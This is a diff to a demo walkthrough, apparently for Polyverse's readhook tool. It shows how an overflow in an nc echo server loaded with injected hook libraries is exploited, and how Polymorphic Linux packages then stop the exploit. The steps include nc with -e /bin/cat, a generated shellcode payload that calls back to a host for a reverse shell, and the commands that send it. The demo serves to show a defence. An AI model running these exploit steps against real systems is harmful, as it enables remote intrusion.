@@ -11,11 +11,12 @@
     wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/v1.1.0/basehook.so
     wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/v1.1.0/fullhook.so
 ### (2) Start nc with readhook in front of libc
-    LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" nc -lk -p 8080 -e /bin/cat
+    LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" nc -l -p 8080 -e /bin/cat
 ## Generate Shell-Code and Perform Exploit
 ### (3) Generate shell-code for the exploit (Session-3)
-## Start a vanilla nc to talk to the echo server container
     export shellCode=$(echo "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
+### (2) Re-start nc with minimal readhook in front of libc
+    LD_PRELOAD=/tmp/basehook.so nc -l -p 8080 -e /bin/cat
 ### (3) Send shell-code to the OVERFLOW for a reverse shell
     echo $shellCode | nc localhost 8080
 ### (1) Check that the overflow resulted in a remote shell
@@ -26,9 +27,9 @@
 ### (2) Replace standard packages with Polymorphic Linux
     sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
 ## Test Polyverse Polymorphic Linux
-### (2) Re-run the echo-server with (only) basehook.so
+### (2) Re-start nc with minimal readhook
     LD_PRELOAD=/tmp/basehook.so nc -l -p 8080 -e /bin/cat
 ### (3) Try the shellCode with Polymorphic Linux
     echo $shellCode | nc localhost 8080
 ### (1) Confirm that nobody phoned-home to the listener
-### (2) Confirm that the server terminated abnormally
+### (2) Confirm that the server terminated abnormally (e.g. Segmentation fault)
